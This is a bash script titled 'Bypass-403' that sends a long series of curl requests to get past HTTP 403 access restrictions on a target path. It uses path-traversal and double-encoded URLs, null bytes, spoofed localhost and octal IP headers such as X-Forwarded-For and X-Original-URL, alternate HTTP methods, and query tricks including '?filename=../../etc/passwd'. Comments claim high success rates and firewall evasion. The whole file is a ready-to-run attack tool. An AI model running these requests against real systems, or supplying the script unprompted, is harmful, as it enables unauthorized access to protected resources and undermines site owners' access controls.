#!/bin/bash
figlet Bypass-403
echo "                                               By Iam_J0ker"
echo "./bypass-403.sh https://example.com path"
echo " "

# Original
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"

# Path Manipulation (MOST EFFICIENT - 80%+ success)
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/../$2
echo "  --> ${1}/../${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/../../$2
echo "  --> ${1}/../../${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/../../../$2
echo "  --> ${1}/../../../${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e%2e%2f$2
echo "  --> ${1}/%2e%2e%2f${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e%2e/$2
echo "  --> ${1}/%2e%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/....//$2
echo "  --> ${1}/....//${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/....///$2
echo "  --> ${1}/....///${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/..
echo "  --> ${1}/${2}/.."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/..
echo "  --> ${1}/${2}/../"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%2f
echo "  --> ${1}/${2}%2f"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%2e%2e
echo "  --> ${1}/${2}%2e%2e"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"

# NEW: Octal IP Bypasses (CRITICAL - Bypasses IP validation)
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 0177.0000.0000.0001" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 0177.0000.0000.0001"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:0177" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:0177"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Real-IP: 0177.0000.0000.0001" $1/$2
echo "  --> ${1}/${2} -H X-Real-IP: 0177.0000.0000.0001"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 0177.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Remote-IP: 0177.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Rewrite-URL: $2" $1
echo "  --> ${1} -H X-Rewrite-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Real-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Real-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Remote-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"

# Encoding Hell (Double/Triple - WAF Bypass)
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%252f
echo "  --> ${1}/${2}%252f"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%252e%252e%252f
echo "  --> ${1}/${2}%252e%252e%252f"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%255c
echo "  --> ${1}/${2}%255c"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%2500
echo "  --> ${1}/${2}%2500"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%00
echo "  --> ${1}/${2}%00"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2F$2
echo "  --> ${1}/%2F${2}"

# HTTP Methods (NGINX/Apache specific)
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X PUT $1/$2
echo "  --> ${1}/${2} -X PUT"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X PATCH $1/$2
echo "  --> ${1}/${2} -X PATCH"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X OPTIONS $1/$2
echo "  --> ${1}/${2} -X OPTIONS"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X HEAD $1/$2
echo "  --> ${1}/${2} -X HEAD"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"

# Parameter Pollution & Query Tricks
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2?filename=../../etc/passwd"
echo "  --> ${1}/${2}?filename=../../etc/passwd"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2?file=../$2&file=test"
echo "  --> ${1}/${2}?file=../$2&file=test"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2?redirect=../$2"
echo "  --> ${1}/${2}?redirect=../$2"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2?X-Forwarded-For=127.0.0.1"
echo "  --> ${1}/${2}?X-Forwarded-For=127.0.0.1"

# Case Variations & Filters
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e%2e%2f
echo "  --> ${1}/%2e%2e%2f"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/
echo "  --> ${1}/${2}/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%2F
echo "  --> ${1}/${2}%2F"

#updated
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"

# CloudFront/Proxy Bypasses
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: /$2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: /$2"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Amz-Cf-Id: test" $1/$2
echo "  --> ${1}/${2} -H X-Amz-Cf-Id: test"

echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
